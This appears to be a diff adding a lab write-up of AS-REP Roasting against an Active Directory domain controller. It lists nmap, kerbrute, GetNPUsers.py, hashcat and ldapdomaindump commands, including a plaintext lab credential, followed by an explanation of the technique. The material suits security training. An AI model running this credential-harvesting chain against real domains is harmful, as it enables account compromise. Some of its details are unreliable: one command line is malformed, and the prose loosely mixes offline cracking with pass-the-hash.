@@ -1,0 +1,26 @@
+nmap -sn 192.168.204.0/24
+nmap -Pn -n -sS -p- 192.168.204.128
+nmap -p 389 --script ldap-rootdse 192.168.204.128
+
+cd ~/tools
+.kerbrute_linux_amd64 userenum \
+boy_wordlist.txt \
+-d PROJECT \
+--dc 192.168.204.128
+
+GetNPUsers.py PROJECT/ \\n  -dc-ip 192.168.204.128 \\n  -usersfile real_user.txt \\n  -outputfile asrep_hashes.txt
+
+hashcat -m 18200 asrep_hashes.txt wordlist.txt
+
+ldapdomaindump -u PROJECT\\hecscow -p Whyyouwannaknow4\@ 192.168.204.128
+
+The final scenario involved setting up a lab to emulate a Kerberos exploitation attack, specifically AS-REP Roasting, 
+which is subtechnique T1558.004 under T1558: Steal or Forge Kerberos Tickets. AS-REP Roasting targets Kerberos authentication 
+in Active Directory environments where pre-authentication is disabled for user accounts, allowing attackers to request and receive 
+encrypted ticket responses that can be cracked offline for password hashes. This technique exploits the Authentication Server Response (AS-REP) 
+message in the Kerberos protocol. Adversaries use it to harvest credentials without needing initial valid authentication, enabling them to 
+compromise accounts stealthily, especially in misconfigured domains, and use the obtained hashes for further attacks like pass-the-hash or overpass-the-hash.
+
+In this attack, an attacker enumerates accounts with pre-auth disabled, sends an AS-REQ without pre-auth data, receives the AS-REP, extracts the hash, 
+and cracks it offline. Prerequisites include domain access (even low-privileged) and vulnerable accounts. The lab setup included a Windows Domain Controller VM 
+and victim user accounts configured without pre-auth.
